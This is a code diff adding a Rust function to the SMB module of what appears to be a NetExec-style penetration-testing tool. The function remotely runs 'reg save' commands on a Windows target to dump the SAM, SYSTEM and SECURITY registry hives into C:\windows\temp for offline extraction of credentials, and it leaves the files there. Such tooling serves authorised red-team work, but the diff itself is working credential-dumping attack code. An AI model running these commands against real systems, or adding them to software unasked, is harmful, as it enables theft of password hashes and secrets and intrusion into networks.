@@ -487,6 +487,41 @@ impl NxcProtocol for SmbProtocol {
 }
 
 impl SmbProtocol {
+    /// Dump SAM, SYSTEM, and SECURITY hives from the target registry.
+    pub async fn secrets_dump(&self, session: &SmbSession) -> Result<String> {
+        if !session.admin {
+            return Err(anyhow::anyhow!("SMB: Administrator privileges required for secretsdump"));
+        }
+
+        info!("SMB: Initializing remote registry dump on {}...", session.target);
+        let mut report = String::from("Vault Extraction Process:\n");
+
+        let hives = [
+            ("SAM", "sam.save"),
+            ("SYSTEM", "system.save"),
+            ("SECURITY", "security.save"),
+        ];
+
+        for (h_name, h_file) in hives {
+            let remote_path = format!("C:\\windows\\temp\\{}", h_file);
+            let cmd = format!("reg save HKLM\\{} {} /y", h_name, remote_path);
+            
+            debug!("SMB: Issuing command: {}", cmd);
+            match self.execute(session, &cmd).await {
+                Ok(_) => {
+                    report.push_str(&format!("  [+] Registry hive {} saved to {}\n", h_name, remote_path));
+                }
+                Err(e) => {
+                    report.push_str(&format!("  [-] Failed to save hive {}: {}\n", h_name, e));
+                }
+            }
+        }
+
+        report.push_str("\nNote: Hive files are stored on the target. Manual download or implementing full SMB2 READ for these paths is required to parse offline.\n");
+        report.push_str("Cleanup: Hive files remain in C:\\windows\\temp\\ until manual removal or further automation.");
+
+        Ok(report)
+    }
     fn build_session_setup_ntlm_negotiate(&self, _creds: &Credentials) -> Vec<u8> {
         let header = Smb2Header::new(0x0001); // SESSION_SETUP
         let mut pkt = header.to_bytes();
